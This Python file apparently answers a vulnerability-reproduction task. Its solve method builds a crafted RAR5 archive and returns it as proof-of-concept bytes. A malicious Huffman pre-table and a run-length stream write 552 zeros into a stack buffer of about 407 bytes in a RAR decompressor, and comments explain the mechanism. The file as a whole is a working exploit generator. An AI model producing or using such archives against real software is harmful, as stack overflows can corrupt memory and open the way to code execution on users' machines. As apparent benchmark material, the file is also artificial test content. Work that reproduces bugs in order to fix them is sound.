import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # 1. RAR5 Signature
        rar_signature = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # 2. Main Archive Header
        main_header_data = b'\x07\x02\x00'  # Size=7, Type=Main(2), Flags=0
        main_header_crc = zlib.crc32(main_header_data).to_bytes(4, 'little')
        main_archive_header = main_header_crc + main_header_data

        # 3. Compressed Data Block (contains malicious Huffman table)
        # The core of the PoC. This block is crafted to cause a stack buffer
        # overflow during the parsing of the Huffman table for decompression.
        #
        # - Block Header: 0xC0 (last block, table present, byte aligned).
        # - Pre-table Header: 0x12 (HNC-1, where HNC=19 is the alphabet size
        #   for the pre-table).
        # - Pre-table Data: 10 bytes that define a Huffman table for opcodes 0-18,
        #   giving a very short (1-bit) code to the RLE opcode 18.
        # - RLE Stream: 4 bytes of 0xFF. Each byte represents a command to repeat
        #   a 'zero' bit-length 138 times. Four commands write 552 zeros,
        #   overflowing the ~407 byte 'BitLength' stack buffer.
        compressed_data = (
            b'\xc0' +  # Block Header
            b'\x12' +  # Pre-table Header (HNC-1)
            b'\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' +  # Pre-table Data
            b'\xff\xff\xff\xff'  # Malicious RLE Stream
        )

        # 4. File Header (describes the compressed data)
        data_size_vint = len(compressed_data).to_bytes(1, 'little')
        unpacked_size_vint = b'\x01'
        file_name = b'a'
        file_name_len_vint = len(file_name).to_bytes(1, 'little')

        # The core data of the file header, which will be checksummed.
        file_header_core = (
            b'\x03' +                  # Type: File Header
            b'\x04' +                  # Flags: DataSize is present
            data_size_vint +           # Size of compressed data block
            unpacked_size_vint +       # Dummy unpacked size
            b'\x20\x00\x00\x00' +      # Dummy file attributes
            b'\x00\x00\x00\x00' +      # Dummy file CRC32
            b'\x50' +                  # Compression info (Method 5, 64KB dict)
            b'\x02' +                  # Host OS: Windows
            file_name_len_vint +       # Length of filename
            file_name                  # Filename
        )

        # Prepend the header's own size to the data for CRC calculation.
        header_size_vint = len(file_header_core).to_bytes(1, 'little')
        file_header_data = header_size_vint + file_header_core
        file_header_crc = zlib.crc32(file_header_data).to_bytes(4, 'little')
        file_header = file_header_crc + file_header_data

        # 5. End of Archive Header
        end_header_data = b'\x07\x05\x00' # Size=7, Type=End(5), Flags=0
        end_header_crc = zlib.crc32(end_header_data).to_bytes(4, 'little')
        end_archive_header = end_header_crc + end_header_data

        # Assemble the final RAR5 file
        return (
            rar_signature +
            main_archive_header +
            file_header +
            compressed_data +
            end_archive_header
        )